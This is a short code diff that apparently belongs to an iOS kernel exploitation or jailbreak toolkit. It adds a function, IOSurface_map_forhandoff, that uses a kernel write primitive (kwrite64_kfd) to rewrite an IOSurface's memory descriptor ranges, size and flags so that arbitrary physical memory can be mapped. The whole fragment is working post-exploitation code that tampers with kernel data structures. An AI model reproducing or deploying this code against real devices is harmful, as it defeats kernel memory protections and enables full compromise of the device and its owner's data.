@@ -152,7 +152,33 @@ uint64_t ipc_entry_lookup(mach_port_name_t port_name)
     
     return kobject;
 }
+mach_port_t IOSurface_map_forhandoff(uint64_t phys, uint64_t size)
+{
+    mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);
 
+    uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
+    uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
+    uint64_t desc = IOSurface_get_memoryDescriptor(surface);
+    uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
+
+    kwrite64_kfd(ranges, phys);
+    kwrite64_kfd(ranges+8, size);
+
+    IOMemoryDescriptor_set_size(desc, size);
+
+    kwrite64_kfd(desc + 0x70, 0);
+    kwrite64_kfd(desc + 0x18, 0);
+    kwrite64_kfd(desc + 0x90, 0);
+
+    IOMemoryDescriptor_set_wired(desc, true);
+
+    uint32_t flags = IOMemoryDescriptor_get_flags(desc);
+    IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
+
+    IOMemoryDescriptor_set_memRef(desc, 0);
+
+    return surfaceMachPort;
+}
 void *IOSurface_map(uint64_t phys, uint64_t size)
 {
     mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);
